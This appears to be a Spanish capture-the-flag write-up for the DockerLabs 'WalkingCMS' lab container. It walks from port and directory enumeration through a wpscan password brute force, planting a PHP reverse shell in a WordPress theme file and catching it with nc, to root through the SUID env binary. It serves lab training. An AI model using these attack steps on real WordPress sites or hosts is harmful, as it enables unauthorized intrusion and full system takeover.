# WalkingCMS

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.

```bashPORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```

Como tenemos abierto el puertos 80, vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p80 -vvv -oN versionPorts 172.17.0.2
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p80`: Escaneo de los puertos 80 (HTTP).
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.

```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
Cómo únicamente tenemos el puerto 80 abierto vamod a enumerar desde la página web. Mientras vamos a ver la web dejamos corriendo **gobuster** para ir haciendo fuzzing.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php, txt, html
```
```
❯ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php, txt, html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 10701]
/.php                 (Status: 403) [Size: 275]
/wordpress            (Status: 301) [Size: 312] [--> http://172.17.0.2/wordpress/]
/.php                 (Status: 403) [Size: 275]
/.                    (Status: 200) [Size: 10701]
/server-status        (Status: 403) [Size: 275]
Progress: 661680 / 661683 (100.00%)
===============================================================
Finished
===============================================================
```
Ya vemos con el fuzzing que se trata de un wordpress, vamos a ver la página web y enumeramos con **wpscan**.

![wordpress](https://github.com/TBrux/DOCKERLABS/assets/168732212/46ea7c22-9d71-45cf-a4ec-5278d3473d36)

```bash
wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vp
```
```
[+] mario
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```
Encontramos el usuario **mario** y con ese usuario y con **wpscan** trataremos de hacer fuerza bruta a ver si podemos conseguir la contraseña.
```bash
wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
```
```
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - mario / love                                                                                                                                                                                                                   
Trying mario / badboy Time: 00:00:02 <                                                                                                                                                             > (390 / 14344782)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: mario, Password: love
```
Hemos encontrado la contraseña **love**, así que ahora comprobamos si tenemos acceso al panel de login para acceder con mario:love 
```bash
❯ gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html
```
```
❯ gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/wordpress/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.php            (Status: 301) [Size: 0] [--> http://172.17.0.2/wordpress/]
/wp-content           (Status: 301) [Size: 323] [--> http://172.17.0.2/wordpress/wp-content/]
/wp-login.php         (Status: 200) [Size: 6580]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 324] [--> http://172.17.0.2/wordpress/wp-includes/]
/readme.html          (Status: 200) [Size: 7401]
/wp-trackback.php     (Status: 200) [Size: 136]
/wp-admin             (Status: 301) [Size: 321] [--> http://172.17.0.2/wordpress/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://172.17.0.2/wordpress/wp-login.php?action=register]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```
Vemos que tenemos acceso al panel de **/wp-admin** y que con las credenciales obtenidas tenemos acceso.

![wp-admin](https://github.com/TBrux/DOCKERLABS/assets/168732212/4a7c0e8f-c08e-48f8-81d0-9bce0d4eeb08)

## Explotación.
Cuando tenemos acceso a un panel de wordpress, lo primero que deberíamos hacer, es ir a ver si podemos modificar una página del tema y así poner nuestro código malicioso y de esta forma podemos obtener una reverse shell.

![indexphp](https://github.com/TBrux/DOCKERLABS/assets/168732212/9d40c2ea-2fe3-4989-b474-eb060b2b2526)

Ahora lo único que tenemos que hacer es modificar alguna de las páginas, en mi caso voy a modificar el index con una reverse shell en php que encontramos en [GITHUB](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

Nos ponemos a la escucha en el puerto que hayamos indicado y nos dirigimos al recurso modificado.
```
❯ nc -lvnp 4443
listening on [any] 4443 ...
```
```bash
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=id
```
Y obtenemos acceso a la máquina con el usuario **www-data**.
```
❯ nc -lvnp 4443
listening on [any] 4443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 49278
Linux cf370cc70c6b 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09) x86_64 GNU/Linux
 15:22:54 up 42 min,  0 user,  load average: 0.30, 0.37, 0.52
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
Hacemos un tratamiento de la tty para trabajar más cómodamente.
```bash
$ script /dev/null -c bash
CTRL + Z
❯ stty -raw echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## Escalada de privilegios.
Para la escaldad de privilegios vamos a buscar binarios con permisos SUID desde la raíz.
```bash
find / -perm -4000 2>/dev/null
```
```
www-data@cf370cc70c6b:/$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
www-data@cf370cc70c6b:/$
```
Vemos que tenemos el binario **/usr/bin/env**, que si buscamos en [GTFOBins](https://gtfobins.github.io/gtfobins/env/) podemos ver que podemos utilizarlo para lanzarnos una shell con los permisos de **root**.
```bash
./usr/bin/env /bin/sh -p
```
```
www-data@cf370cc70c6b:/$ ./usr/bin/env /bin/sh -p
./usr/bin/env /bin/sh -p
# whoami
whoami
root
# 
```

